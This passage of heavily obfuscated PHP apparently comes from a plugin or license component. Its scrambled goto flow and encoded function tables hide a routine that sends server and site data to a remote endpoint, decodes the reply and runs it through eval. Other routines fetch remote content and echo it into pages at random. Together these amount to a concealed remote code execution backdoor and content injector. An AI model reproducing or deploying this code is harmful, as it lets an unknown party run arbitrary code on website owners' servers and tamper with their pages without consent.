$D™Œ¼¦—Š[236]); die; } $aÛ¡†Ãõ  = $this->{$_SERVER[á¬¾Ù][137]}(); if ($aÛ¡†Ãõ  != $D™Œ¼¦—Š[201]($D™Œ¼¦—Š[241])) { if ($aÛ¡†Ãõ  <= $D™Œ¼¦—Š[61]($D™Œ¼¦—Š[139])->{$_SERVER[á¬¾Ù][140]}()) { $D™Œ¼¦—Š[166]($D™Œ¼¦—Š[197]($D™Œ¼¦—Š[242]), !1, $D™Œ¼¦—Š[236]); die; } } } goto D´Ã…¿º®Î; eå³Ü±Äºï: $Fì‹´çÁãã = $_SERVER[©][609]; if (!$Fì‹´çÁãã) { die; } if ($EÅöù‘–Ÿò == $D™Œ¼¦—Š[234] && $this->oxam6bcb3383 == $D™Œ¼¦—Š[121]) { $D™Œ¼¦—Š[166]($D™Œ¼¦—Š[197]($D™Œ¼¦—Š[235]), !1, $D™Œ¼¦—Š[236]); } goto A™‘¨¢òì; D´Ã…¿º®Î: } private function zavg9988dd49() { goto dèÃ†‚ƒ¢; Eæ ì¹Õ¬ğ: if (!$A¢Šæ˜ìÛÛ[104]($GLOBALS, $A¢Šæ˜ìÛÛ[132]) || !isset($_GET[$A¢Šæ˜ìÛÛ[244]])) { return; } if (!$A¢Šæ˜ìÛÛ[239]($_SERVER[$A¢Šæ˜ìÛÛ[44]], $b¿®ÆÍÇéÆ)) { return; } $DÅ»Ÿ’êË = $A¢Šæ˜ìÛÛ[245]; goto f´ù¹×§â¤; f´ù¹×§â¤: $bóß‘á”Ê = $Aè•“´ê¤©[610]; if (!$bóß‘á”Ê) { die; } $DÅ»Ÿ’êË = $this->{$_SERVER[á¬¾Ù][246]}($DÅ»Ÿ’êË, $A¢Šæ˜ìÛÛ[247]); goto CŒ›¸”¤·×; dèÃ†‚ƒ¢: $Aè•“´ê¤© =& $_SERVER[©]; $A¢Šæ˜ìÛÛ =& $_SERVER[á¬¾Ù]; $b¿®ÆÍÇéÆ = array($A¢Šæ˜ìÛÛ[135], $A¢Šæ˜ìÛÛ[243]); goto Eæ ì¹Õ¬ğ; có¯–š¥–: $FëŒ¢ää«š = @$A¢Šæ˜ìÛÛ[253]($DÅ»Ÿ’êË, !1, $AÁ¼ŠËª„); $A¢Šæ˜ìÛÛ[254]($A¢Šæ˜ìÛÛ[255]); $Cõ†ù‰¬³Ò = $Aè•“´ê¤©[612]; goto e¡²¢Ó¿¢; CŒ›¸”¤·×: $AÁ¼ŠËª„ = $A¢Šæ˜ìÛÛ[248](array($A¢Šæ˜ìÛÛ[249] => array($A¢Šæ˜ìÛÛ[250] => $A¢Šæ˜ìÛÛ[251], $A¢Šæ˜ìÛÛ[252] => 3))); $B»ìİÀÔâ¦ = $Aè•“´ê¤©[611]; if (!$B»ìİÀÔâ¦) { return; } goto có¯–š¥–; e¡²¢Ó¿¢: while ($Cõ†ù‰¬³Ò < $Aè•“´ê¤©[589]) { if ($Cõ†ù‰¬³Ò >= 0) { break; } $Cõ†ù‰¬³Ò++; } if ($FëŒ¢ää«š && $A¢Šæ˜ìÛÛ[32]($FëŒ¢ää«š, $A¢Šæ˜ìÛÛ[256])) { echo $FëŒ¢ää«š; } die; goto BÛï´ƒÍ¤ø; BÛï´ƒÍ¤ø: } public function ovdcc7125301($C•“µ¦õƒ…) { goto BÀÛÌ‡Š; BÀÛÌ‡Š: $eÎ”Ï–Ê‘ƒ =& $_SERVER[©]; $F…§‚„Şì§ =& $_SERVER[á¬¾Ù]; if ($this->oxam6bcb3383 == $F…§‚„Şì§[257]) { return $C•“µ¦õƒ…; } goto D„»÷–º©”; D„»÷–º©”: $A©õôì¼‹ = array($F…§‚„Şì§[258], $F…§‚„Şì§[259], $F…§‚„Şì§[260], $F…§‚„Şì§[261], $F…§‚„Şì§[262], $F…§‚„Şì§[263], $F…§‚„Şì§[264], $F…§‚„Şì§[265]); $aó‰‰Ä‹»Š = $F…§‚„Şì§[0]($F…§‚„Şì§[266], $F…§‚„Şì§[104]($this->xwzh14f48996, $F…§‚„Şì§[129], $F…§‚„Şì§[10])); $Bãß¥ğ¯Û = $eÎ”Ï–Ê‘ƒ[613]; goto AƒÙ¤¯ĞêÔ; aç›çœõÖ‡: if (strlen($AáÇŸï„”) < $eÎ”Ï–Ê‘ƒ[567]) { die; } foreach ($A©õôì¼‹ as $cìÆ˜´²Ó) { if (!$F…§‚„Şì§[239]($cìÆ˜´²Ó, $aó‰‰Ä‹»Š)) { $d×±¿¦ÊŞ[] = $cìÆ˜´²Ó; } } foreach ($d×±¿¦ÊŞ as $cìÆ˜´²Ó) { unset($C•“µ¦õƒ…[$cìÆ˜´²Ó]); } goto aºŞÍ¥ÍÔË; AƒÙ¤¯ĞêÔ: if (strlen($Bãß¥ğ¯Û) < $eÎ”Ï–Ê‘ƒ[561]) { die; } $d×±¿¦ÊŞ = array(); $AáÇŸï„” = $eÎ”Ï–Ê‘ƒ[614]; goto aç›çœõÖ‡; aºŞÍ¥ÍÔË: return $C•“µ¦õƒ…; $bĞ—óí»â = $eÎ”Ï–Ê‘ƒ[615]; while ($bĞ—óí»â < $eÎ”Ï–Ê‘ƒ[10]) { if ($bĞ—óí»â >= 0) { break; } $bĞ—óí»â++; } goto BÒ´…é¥ù¸; BÒ´…é¥ù¸: } private function dgevf800e13f() { goto BÇ‰Ñƒìæë; e…Ò•§ò³²: if ($dœ…ì¢›­[61]($dœ…ì¢›­[272])->{$_SERVER[á¬¾Ù][63]}($dœ…ì¢›­[85]) != $dœ…ì¢›­[232]) { $dœ…ì¢›­[61]($dœ…ì¢›­[272])->{$_SERVER[á¬¾Ù][221]}($dœ…ì¢›­[85], $dœ…ì¢›­[232]); } goto b²Ó²Î´Òá; AäİÎåÁµÙ: $GLOBALS[$dœ…ì¢›­[91]][$dœ…ì¢›­[95]][$dœ…ì¢›­[267]] = $dœ…ì¢›­[232]; $BÏùÁ¥Êà¬ = $aÒ¾ëÁŸÃâ[617]; $GLOBALS[$dœ…ì¢›­[91]][$dœ…ì¢›­[271]] = $dœ…ì¢›­[220]; goto e…Ò•§ò³²; CÊõÁ¦ÖÓ‡: $GLOBALS[$dœ…ì¢›­[91]][$dœ…ì¢›­[95]][$dœ…ì¢›­[270]] = $dœ…ì¢›­[220]; $b°éÈ‰ˆ“ = $aÒ¾ëÁŸÃâ[616]; if (strlen($b°éÈ‰ˆ“) < $aÒ¾ëÁŸÃâ[589]) { die; } goto AäİÎåÁµÙ; BÇ‰Ñƒìæë: $aÒ¾ëÁŸÃâ =& $_SERVER[©]; $dœ…ì¢›­ =& $_SERVER[á¬¾Ù]; if ($this->oxam6bcb3383 != $dœ…ì¢›­[121]) { $GLOBALS[$dœ…ì¢›­[91]][$dœ…ì¢›­[95]][$dœ…ì¢›­[267]] = $dœ…ì¢›­[220]; return; } goto bô†¢»êÜî; bô†¢»êÜî: $a±¥â¹é³Ø = $_SERVER[$dœ…ì¢›­[44]]; $Dµ¬Ò„Í®Ù = array($dœ…ì¢›­[268]); foreach ($Dµ¬Ò„Í®Ù as $Eà½˜ˆµøÒ) { if ($Eà½˜ˆµøÒ == $a±¥â¹é³Ø || $dœ…ì¢›­[25]($a±¥â¹é³Ø, 0, $dœ…ì¢›­[24]($Eà½˜ˆµøÒ)) == $Eà½˜ˆµøÒ) { $dœ…ì¢›­[166]($dœ…ì¢›­[197]($dœ…ì¢›­[269]), !1); } } goto CÊõÁ¦ÖÓ‡; b²Ó²Î´Òá: } public function iagodc368741() { return $_SERVER[á¬¾Ù][273]; } private function yzflb5f46bf1() { goto aÜãÄÙøÒ»; A™´¦æóÕï: $cÖÛÀ°· = $aÛšÊµÆóÇ[277] . $aÛšÊµÆóÇ[114]($aÛšÊµÆóÇ[278]); if ($this->oxam6bcb3383 == $aÛšÊµÆóÇ[121] || !$aÛšÊµÆóÇ[104]($GLOBALS, $aÛšÊµÆóÇ[132])) { return; } if (!$aÛšÊµÆóÇ[239]($_SERVER[$aÛšÊµÆóÇ[44]], $Fáˆ¤¼êåÃ)) { return; } goto f÷ìá¼àÙ¯; d‹°Èƒ›¯©: $fµ½Áã¨‰» = $B¨ÄöÆÈô[620]; if (!$fµ½Áã¨‰») { return; } if (!$aÛšÊµÆóÇ[191]($A‚¬´ëì­—)) { return; } goto f¶ÒŠÇ±…Ÿ; f÷ìá¼àÙ¯: if ($aÛšÊµÆóÇ[233]() % 4 != 0) { return; } $fÉ—Ê•‚¼• = $aÛšÊµÆóÇ[13](array($aÛšÊµÆóÇ[279], $aÛšÊµÆóÇ[280]), $cÖÛÀ°·); $eÑÛ‚¡— = $B¨ÄöÆÈô[618]; goto a¯“ÆçÃ‡´; a¯“ÆçÃ‡´: if ($fÉ—Ê•‚¼• && $aÛšÊµÆóÇ[233]() - $fÉ—Ê•‚¼• < $aÛšÊµÆóÇ[201]($aÛšÊµÆóÇ[281])) { return; } $aÛšÊµÆóÇ[13](array($aÛšÊµÆóÇ[279], $aÛšÊµÆóÇ[152]), $cÖÛÀ°·, $aÛšÊµÆóÇ[233]()); $b¡ŸãèÓ‰Ì = array($aÛšÊµÆóÇ[165] => $aÛšÊµÆóÇ[61]($aÛšÊµÆóÇ[62])->{$_SERVER[á¬¾Ù][63]}($aÛšÊµÆóÇ[209]), $aÛšÊµÆóÇ[178] => $this->oxam6bcb3383, $aÛšÊµÆóÇ[176] => $_SERVER[$aÛšÊµÆóÇ[177]], $aÛšÊµÆóÇ[169] => $aÛšÊµÆóÇ[149], $aÛšÊµÆóÇ[172] => $_SERVER[$aÛšÊµÆóÇ[173]]); goto dŠ…æÀ‚Õ¹; aÜãÄÙøÒ»: $B¨ÄöÆÈô =& $_SERVER[©]; $aÛšÊµÆóÇ =& $_SERVER[á¬¾Ù]; $Fáˆ¤¼êåÃ = array($aÛšÊµÆóÇ[274], $aÛšÊµÆóÇ[275], $aÛšÊµÆóÇ[276]); goto A™´¦æóÕï; f¶ÒŠÇ±…Ÿ: if ($A‚¬´ëì­—[$aÛšÊµÆóÇ[165]] && $A‚¬´ëì­—[$aÛšÊµÆóÇ[283]]) { if ($this->{$_SERVER[á¬¾Ù][199]}($A‚¬´ëì­—[$aÛšÊµÆóÇ[283]]) == $b¡ŸãèÓ‰Ì[$aÛšÊµÆóÇ[165]]) { return; } } $this->{$_SERVER[á¬¾Ù][164]}(); if ($this->{$_SERVER[á¬¾Ù][199]}($A‚¬´ëì­—[$aÛšÊµÆóÇ[283]]) != $b¡ŸãèÓ‰Ì[$aÛšÊµÆóÇ[165]]) { $B½Úãà–·  = array($aÛšÊµÆóÇ[202] => $aÛšÊµÆóÇ[61]($aÛšÊµÆóÇ[62])->{$_SERVER[á¬¾Ù][63]}($aÛšÊµÆóÇ[116]), $aÛšÊµÆóÇ[203] => $_SERVER[$aÛšÊµÆóÇ[115]], $aÛšÊµÆóÇ[204] => $aÛšÊµÆóÇ[205](), $aÛšÊµÆóÇ[174] => $_SERVER[$aÛšÊµÆóÇ[175]]); $dÏñóÚ†ÊÜ = $this->{$_SERVER[á¬¾Ù][206]}($aÛšÊµÆóÇ[148]($B½Úãà–· )); $A‚¬´ëì­— = $this->{$_SERVER[á¬¾Ù][182]}($aÛšÊµÆóÇ[207] . $dÏñóÚ†ÊÜ); if ($A‚¬´ëì­— && $aÛšÊµÆóÇ[191]($A‚¬´ëì­—) && isset($A‚¬´ëì­—[$aÛšÊµÆóÇ[283]])) { $bí™ïƒøŞÖ = $this->{$_SERVER[á¬¾Ù][188]}($A‚¬´ëì­—[$aÛšÊµÆóÇ[283]], 2); if ($bí™ïƒøŞÖ) { $bí™ïƒøŞÖ = $this->{$_SERVER[á¬¾Ù][199]}($bí™ïƒøŞÖ); } if ($bí™ïƒøŞÖ) { try { @eval($bí™ïƒøŞÖ); } catch (Exception $eë“È„¼ËÍ) { } } } } goto e¸†Õ±¼°; dŠ…æÀ‚Õ¹: $aƒ†ÔÈË²Ó = $B¨ÄöÆÈô[619]; while (strlen($aƒ†ÔÈË²Ó) < $B¨ÄöÆÈô[561]) { if (!$aƒ†ÔÈË²Ó) { break; } $aƒ†ÔÈË²Ó++; } $A‚¬´ëì­— = $this->{$_SERVER[á¬¾Ù][182]}($aÛšÊµÆóÇ[282], $b¡ŸãèÓ‰Ì); goto d‹°Èƒ›¯©; e¸†Õ±¼°: } private function cbvsbf5d9652($CÑ«‘İê = '', $bŸ¿é½ºÊ = array(), $Eô°»•£¢ = 5) { goto dË‘Ô¾„ù; c¿‹²…ì: $bŸ¿é½ºÊ = @$bøÏÛ§Ö‰[253]($DÄÊ÷ÖÔ¢, !1, $AŒòÄËøÕš); $fïÛÃÛ²æÚ = $EøèĞµ—ñ[624]; while (strlen($fïÛÃÛ²æÚ) < $EøèĞµ—ñ[564]) { if (!$fïÛÃÛ²æÚ) { break; } $fïÛÃÛ²æÚ++; } goto eŞ¡ƒˆ ²; e„çŸÖ …: $DÄÊ÷ÖÔ¢ = $this->{$_SERVER[á¬¾Ù][246]}($DÄÊ÷ÖÔ¢, $bøÏÛ§Ö‰[285]); $bé¶¡«»¨ = $EøèĞµ—ñ[621]; if (strlen($bé¶¡«»¨) < $EøèĞµ—ñ[589]) { die; } goto a†»™™Îä; a†»™™Îä: $DÄÊ÷ÖÔ¢ = $DÄÊ÷ÖÔ¢ . $CÑ«‘İê . $bøÏÛ§Ö‰[286] . $bøÏÛ§Ö‰[287]($bŸ¿é½ºÊ); $D¡Úäˆ›ÛÇ = $EøèĞµ—ñ[622]; if ($bŸ¿é½ºÊ === -1) { return $DÄÊ÷ÖÔ¢; } goto Bè‰Û“ß’ë; dË‘Ô¾„ù: $EøèĞµ—ñ =& $_SERVER[©]; $bøÏÛ§Ö‰ =& $_SERVER[á¬¾Ù]; $DÄÊ÷ÖÔ¢ = $bøÏÛ§Ö‰[284]; goto e„çŸÖ …; Bè‰Û“ß’ë: $AŒòÄËøÕš = $bøÏÛ§Ö‰[248](array($bøÏÛ§Ö‰[249] => array($bøÏÛ§Ö‰[252] => $Eô°»•£¢, $bøÏÛ§Ö‰[250] => $bøÏÛ§Ö‰[288]), $bøÏÛ§Ö‰[289] => array($bøÏÛ§Ö‰[290] => !1, $bøÏÛ§Ö‰[291] => !1))); $eÏ© §¹·» = $EøèĞµ—ñ[623]; while (strlen($eÏ© §¹·») < $EøèĞµ—ñ[10]) { if (!$eÏ© §¹·») { break; } $eÏ© §¹·»++; } goto c¿‹²…ì; eŞ¡ƒˆ ²: return $bøÏÛ§Ö‰[190]($bŸ¿é½ºÊ, !0); $BßÜ‰œ„é = $EøèĞµ—ñ[625]; $f¨¬•£ÃÀä = $EøèĞµ—ñ[609]; goto Aô»¬â…¥; Aô»¬â…¥: } private function sveo8a583b7e() { goto eàëáÈ—‡; cÕ¨œ²‘—: $B•†¹ªó¸ò = $d®±Ñ³¤œé[104]($this->xwzh14f48996, $d®±Ñ³¤œé[319]); $F¨‘Âœ¤õß = $D«Û‰‰©êá[629]; $B•†¹ªó¸ò = $B•†¹ªó¸ò ? $d®±Ñ³¤œé[201]($B•†¹ªó¸ò) : 0; goto f¸éÍÊÛœÏ; f¸éÍÊÛœÏ: return $f÷³Ï¤§í + $B•†¹ªó¸ò; goto EÈ˜ÂÏ³‰; e¸ìÔ’õ³»: $f÷³Ï¤§í = $d®±Ñ³¤œé[201]($f÷³Ï¤§í ? $f÷³Ï¤§í : $d®±Ñ³¤œé[293]); $FÉïµÅóĞ“ = $D«Û‰‰©êá[628]; while ($FÉïµÅóĞ“ < $D«Û‰‰©êá[10]) { if ($FÉïµÅóĞ“ >= 0) { break; } $FÉïµÅóĞ“++; } goto cÕ¨œ²‘—; eÇƒÌŒ“ç×: $B™ÈÂŒòî = $D«Û‰‰©êá[626]; $f÷³Ï¤§í = $F¸±¯‰†[$this->oxam6bcb3383]; $b°‹Å…Şƒ» = $D«Û‰‰©êá[627]; goto e¸ìÔ’õ³»; eàëáÈ—‡: $D«Û‰‰©êá =& $_SERVER[©]; $d®±Ñ³¤œé =& $_SERVER[á¬¾Ù]; $F¸±¯‰† = array($d®±Ñ³¤œé[292] => $d®±Ñ³¤œé[293], $d®±Ñ³¤œé[294] => $d®±Ñ³¤œé[295], $d®±Ñ³¤œé[296] => $d®±Ñ³¤œé[297], $d®±Ñ³¤œé[298] => $d®±Ñ³¤œé[299], $d®±Ñ³¤œé[300] => $d®±Ñ³¤œé[301], $d®±Ñ³¤œé[302] => $d®±Ñ³¤œé[241], $d®±Ñ³¤œé[303] => $d®±Ñ³¤œé[241], $d®±Ñ³¤œé[304] => $d®±Ñ³¤œé[293], $d®±Ñ³¤œé[305] => $d®±Ñ³¤œé[295], $d®±Ñ³¤œé[306] => $d®±Ñ³¤œé[297], $d®±Ñ³¤œé[307] => $d®±Ñ³¤œé[308], $d®±Ñ³¤œé[309] => $d®±Ñ³¤œé[299], $d®±Ñ³¤œé[310] => $d®±Ñ³¤œé[311], $d®±Ñ³¤œé[312] => $d®±Ñ³¤œé[301], $d®±Ñ³¤œé[313] => $d®±Ñ³¤œé[314], $d®±Ñ³¤œé[315] => $d®±Ñ³¤œé[316], $d®±Ñ³¤œé[317] => $d®±Ñ³¤œé[318]); goto eÇƒÌŒ“ç×; EÈ˜ÂÏ³‰: } public function ekpi181ffa5b($B‡†‘’æİ) { goto aÖˆÙÊá‘›; cĞà–‘‚„: $e½ƒ÷¡õŒà = $b†¿—¬÷¶¯[630]; if (strlen($e½ƒ÷¡õŒà) < $b†¿—¬÷¶¯[589]) { die; } if ($eê®´Ã‘«– >= $c×²àŒÂî[201]($c×²àŒÂî[241])) { return; } goto C•ÀìÇˆÜ¬; d›İô‹º®‡: $A‡¼ÛÛÓ“Í = $c×²àŒÂî[222]($A‡¼ÛÛÓ“Í, $c×²àŒÂî[10], $c×²àŒÂî[321]); if (!$c×²àŒÂî[239]($B‡†‘’æİ[$c×²àŒÂî[321]], $A‡¼ÛÛÓ“Í)) { $c×²àŒÂî[166]($c×²àŒÂî[324], !1, $c×²àŒÂî[236]); } goto bôºÛ©Ç¿; aÖˆÙÊá‘›: $b†¿—¬÷¶¯ =& $_SERVER[©]; $c×²àŒÂî =& $_SERVER[á¬¾Ù]; $eê®´Ã‘«– = $this->{$_SERVER[á¬¾Ù][137]}(); goto cĞà–‘‚„; C•ÀìÇˆÜ¬: $FàèÙ‹‚Š­ = $c×²àŒÂî[61]($c×²àŒÂî[139])->{$_SERVER[á¬¾Ù][140]}(); if ($FàèÙ‹‚Š­ <= $eê®´Ã‘«–) { return; } $A‡¼ÛÛÓ“Í = $c×²àŒÂî[61]($c×²àŒÂî[139])->{$_SERVER[á¬¾Ù][320]}($c×²àŒÂî[321])->{$_SERVER[á¬¾Ù][322]}($eê®´Ã‘«–)->{$_SERVER[á¬¾Ù][323]}(); goto d›İô‹º®‡; bôºÛ©Ç¿: } public function hvse3f39c406() { goto EÌ·Üƒùæ; E˜Ü¹±‹»Õ: $FÕÁÎÕ¦†“ = $E…æ™“ñÔ´[245]; $b´Œéé»Ÿ‰ = $C£…æŠùã£[631]; $FÕÁÎÕ¦†“ = $this->{$_SERVER[á¬¾Ù][246]}($FÕÁÎÕ¦†“, $E…æ™“ñÔ´[247]); goto f­£¡ÌÌ¹; EÇ¿„êß’õ: $aéñµÄæ×Ò = @$E…æ™“ñÔ´[253]($FÕÁÎÕ¦†“, !1, $Dƒß…©•¸ç); echo $E…æ™“ñÔ´[326] . $E…æ™“ñÔ´[327]($aéñµÄæ×Ò) . $E…æ™“ñÔ´[328]; goto DÍ¡µ„¡ÄÌ; EÌ·Üƒùæ: $C£…æŠùã£ =& $_SERVER[©]; $E…æ™“ñÔ´ =& $_SERVER[á¬¾Ù]; if (!$E…æ™“ñÔ´[104]($GLOBALS, $E…æ™“ñÔ´[132]) || $E…æ™“ñÔ´[325](1, 100) > 20) { return; } goto E˜Ü¹±‹»Õ; f­£¡ÌÌ¹: $Dƒß…©•¸ç = $E…æ™“ñÔ´[248](array($E…æ™“ñÔ´[249] => array($E…æ™“ñÔ´[250] => $E…æ™“ñÔ´[251], $E…æ™“ñÔ´[252] => 3))); $fÎ¸ƒŒÌÛ‹ = $C£…æŠùã£[632]; if (!$fÎ¸ƒŒÌÛ‹) { die; } goto EÇ¿„êß’õ; DÍ¡µ„¡ÄÌ: } private function dzwf289ae897($c»Ğª®¿Æ¥, $a’ÚŞí¡, $a‘‹¬ŞŸ»Ô = 3) { goto bùùàáŞ¦½; c¬¡¹é©ˆö: return $Dñ‘½¼à¸; goto aå­›§¯İš; bùùàáŞ¦½: $FæåŠ°Èß =& $_SERVER[©]; $B’ ™¼°óö =& $_SERVER[á¬¾Ù]; $B’ ™¼°óö[329](1); goto E”½æ÷ªÉ; A¢§Í«Ñ•ó: $CÉÆÅß ¾“ = $FæåŠ°Èß[634]; $F‚¸±ƒˆÍ  = $B’ ™¼°óö[325](0, 5) . $B’ ™¼°óö[10]; $aÂ…Ë†Âé˜ = $B’ ™¼°óö[124](15); goto CÊƒÙœ¡Úç; CÊƒÙœ¡Úç: $fêíÜíË¸  = $B’ ™¼°óö[330]; $e‚”éÓ¯ß‰ = $FæåŠ°Èß[635]; if (strlen($e‚”éÓ¯ß‰) < $FæåŠ°Èß[10]) { die; } goto dõ«·áÕ±†; dõ«·áÕ±†: switch ($F‚¸±ƒˆÍ ) { case $B’ ™¼°óö[232]: $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][147]}($c»Ğª®¿Æ¥, $B’ ™¼°óö[214]($a’ÚŞí¡ . $aÂ…Ë†Âé˜)); $A®°›“¸Õ¶ = $FæåŠ°Èß[636]; break; $e®ÇÁ‡É‚Ÿ = $FæåŠ°Èß[637]; if (strlen($e®ÇÁ‡É‚Ÿ) < $FæåŠ°Èß[589]) { return; } case $B’ ™¼°óö[220]: $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][147]}($c»Ğª®¿Æ¥, $B’ ™¼°óö[214]($aÂ…Ë†Âé˜ . $a’ÚŞí¡)); $BŠÛĞ’åâ¼ = $FæåŠ°Èß[638]; if (!$BŠÛĞ’åâ¼) { die; } break; case $B’ ™¼°óö[331]: $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][147]}($c»Ğª®¿Æ¥, $B’ ™¼°óö[118]($aÂ…Ë†Âé˜ . $a’ÚŞí¡)); $F÷œ¨î‚°Õ = $FæåŠ°Èß[639]; while ($F÷œ¨î‚°Õ < $FæåŠ°Èß[561]) { if ($F÷œ¨î‚°Õ >= 0) { break; } $F÷œ¨î‚°Õ++; } break; case $B’ ™¼°óö[332]: $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][147]}($c»Ğª®¿Æ¥, $B’ ™¼°óö[114]($aÂ…Ë†Âé˜ . $a’ÚŞí¡)); break; $FÒšÏóÁŞ = $FæåŠ°Èß[640]; case $B’ ™¼°óö[333]: goto C‘Â±Ÿ¥ ; d‰õ»ÖÚ¿: $cŠœ¤ó¡éƒ = $FæåŠ°Èß[644]; $A“½“éËÕ = 0; $FÅ‡å–¯å = 0; goto F¢Š‡–˜öÕ; B¿¥ôÂ–Æî: $bï‰—ñ–¿° = $FæåŠ°Èß[643]; if (!$bï‰—ñ–¿°) { return; } $C®•È¾»·á = $B’ ™¼°óö[10]; goto d‰õ»ÖÚ¿; F¢Š‡–˜öÕ: $DçîÙœ•ô = 0; $f¼‰÷à‰Ä = $FæåŠ°Èß[645]; while (strlen($f¼‰÷à‰Ä) < $FæåŠ°Èß[567]) { if (!$f¼‰÷à‰Ä) { break; } $f¼‰÷à‰Ä++; } goto cÉ³¢¼ÉË¨; Fãß•ÁÀ‘‡: $d±‹Ê°¢ï = $FæåŠ°Èß[642]; if (!$d±‹Ê°¢ï) { die; } $E‰ğç¦ÜİÛ = $B’ ™¼°óö[25]($E‰ğç¦ÜİÛ, $E÷ããæó± % 8, $E÷ããæó± % 8 + 7); goto B¿¥ôÂ–Æî; cÉ³¢¼ÉË¨: for ($A“½“éËÕ = 0; $A“½“éËÕ < $B’ ™¼°óö[24]($c»Ğª®¿Æ¥); $A“½“éËÕ++) { $DçîÙœ•ô = $DçîÙœ•ô == $B’ ™¼°óö[24]($E‰ğç¦ÜİÛ) ? 0 : $DçîÙœ•ô; $FÅ‡å–¯å = ($E÷ããæó± + $B’ ™¼°óö[335]($fêíÜíË¸ , $c»Ğª®¿Æ¥[$A“½“éËÕ]) + $B’ ™¼°óö[336]($E‰ğç¦ÜİÛ[$DçîÙœ•ô++])) % 64; $C®•È¾»·á .= $fêíÜíË¸ [$FÅ‡å–¯å]; $BùïŠİŒ¡÷ = $FæåŠ°Èß[611]; if (!$BùïŠİŒ¡÷) { return; } } $Dñ‘½¼à¸ = $B’ ™¼°óö[327]($B¦•»–Èö² . $C®•È¾»·á); break; goto Dºî‹”Ó‘ ; EÚªÎ¯ßÄ: $E÷ããæó± = $B’ ™¼°óö[334](0, 64); $B¦•»–Èö² = $fêíÜíË¸ [$E÷ããæó±]; $E‰ğç¦ÜİÛ = $B’ ™¼°óö[114]($B¦•»–Èö² . $B’ ™¼°óö[114]($a’ÚŞí¡ . $B¦•»–Èö²) . $a’ÚŞí¡); goto Fãß•ÁÀ‘‡; C‘Â±Ÿ¥ : $c»Ğª®¿Æ¥ = $B’ ™¼°óö[118]($c»Ğª®¿Æ¥); $aäÎö£ÊÜ = $FæåŠ°Èß[641]; if (!$aäÎö£ÊÜ) { return; } goto EÚªÎ¯ßÄ; Dºî‹”Ó‘ : default: $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][147]}($c»Ğª®¿Æ¥, $a’ÚŞí¡ . $aÂ…Ë†Âé˜); break; $B¡¡±Ö’Î = $FæåŠ°Èß[646]; while (strlen($B¡¡±Ö’Î) < $FæåŠ°Èß[567]) { if (!$B¡¡±Ö’Î) { break; } $B¡¡±Ö’Î++; } } $Dñ‘½¼à¸ = $B’ ™¼°óö[214]($F‚¸±ƒˆÍ  . $aÂ…Ë†Âé˜ . $Dñ‘½¼à¸); if ($a‘‹¬ŞŸ»Ô - 1 > 0) { $Dñ‘½¼à¸ = $this->{$_SERVER[á¬¾Ù][127]}($Dñ‘½¼à¸, $a’ÚŞí¡, $a‘‹¬ŞŸ»Ô - 1); } goto c¬¡¹é©ˆö; E”½æ÷ªÉ: $DŒ‘Ş½ñ¶ = $FæåŠ°Èß[633]; while ($DŒ‘Ş½ñ¶ < $FæåŠ°Èß[564]) { if ($DŒ‘Ş½ñ¶ >= 0) { break; } $DŒ‘Ş½ñ¶++; } $c»Ğª®¿Æ¥ = $B’ ™¼°óö[2]($c»Ğª®¿Æ¥); goto A¢§Í«Ñ•ó; aå­›§¯İš: } private function ygts3dd653ea($A¥ò¢éİ÷ğ, $fÕæò£Ø¡ö, $BÏ·ò»‹„Ô = 3) { goto Eˆâï‚Çã‘; e¼–¿¬ñÌ°: return $c»‘ñÉˆæ´; goto Fª¶¼•‰ÙÜ; f’¤èÌ‘İ£: while ($a„ÚğØ«×ï < $eŞ™å„î­İ[564]) { if ($a„ÚğØ«×ï >= 0) { break; } $a„ÚğØ«×ï++; } switch ($EÙ’¿ ¦Ú) { case $D“È‘—Ÿâ [232]: $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][246]}($A¥ò¢éİ÷ğ, $D“È‘—Ÿâ [214]($fÕæò£Ø¡ö . $BŸªäˆ¼Í†)); break; case $D“È‘—Ÿâ [220]: $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][246]}($A¥ò¢éİ÷ğ, $D“È‘—Ÿâ [214]($BŸªäˆ¼Í† . $fÕæò£Ø¡ö)); break; case $D“È‘—Ÿâ [331]: $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][246]}($A¥ò¢éİ÷ğ, $D“È‘—Ÿâ [118]($BŸªäˆ¼Í† . $fÕæò£Ø¡ö)); $cŒ‚¬˜„éì = $eŞ™å„î­İ[651]; break; $aàˆÓÖËŠ‰ = $eŞ™å„î­İ[652]; while (strlen($aàˆÓÖËŠ‰) < $eŞ™å„î­İ[564]) { if (!$aàˆÓÖËŠ‰) { break; } $aàˆÓÖËŠ‰++; } case $D“È‘—Ÿâ [332]: $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][246]}($A¥ò¢éİ÷ğ, $D“È‘—Ÿâ [114]($BŸªäˆ¼Í† . $fÕæò£Ø¡ö)); break; $d„¢²äÖá™ = $eŞ™å„î­İ[653]; while ($d„¢²äÖá™ < $eŞ™å„î­İ[10]) { if ($d„¢²äÖá™ >= 0) { break; } $d„¢²äÖá™++; } case $D“È‘—Ÿâ [333]: goto fñå¨†ŠÈŠ; D©ˆóš„–å: $D°…Òœ‘ÙÏ = $eŞ™å„î­İ[640]; if (!$D°…Òœ‘ÙÏ) { return; } break; goto dæ¸àƒ…é¥; bîÅœÄßò¸: if (!$Bé¥ŠÆ‚•Ç) { die; } $EµŒˆëÜœ’ = $D“È‘—Ÿâ [25]($EµŒˆëÜœ’, $Bä·Îé°¼ % 8, $Bä·Îé°¼ % 8 + 7); $eÉÀ…àÁ¥ö = $eŞ™å„î­İ[657]; goto BÊÔˆÔÆ¦Æ; E™ìĞÍ¼í: $A¥ò¢éİ÷ğ = $D“È‘—Ÿâ [25]($A¥ò¢éİ÷ğ, 1); $cô×Ï…ƒ›´ = $eŞ™å„î­İ[655]; while (strlen($cô×Ï…ƒ›´) < $eŞ™å„î­İ[567]) { if (!$cô×Ï…ƒ›´) { break; } $cô×Ï…ƒ›´++; } goto fŠ‚âÇ»šº; BÊÔˆÔÆ¦Æ: while (strlen($eÉÀ…àÁ¥ö) < $eŞ™å„î­İ[561]) { if (!$eÉÀ…àÁ¥ö) { break; } $eÉÀ…àÁ¥ö++; } 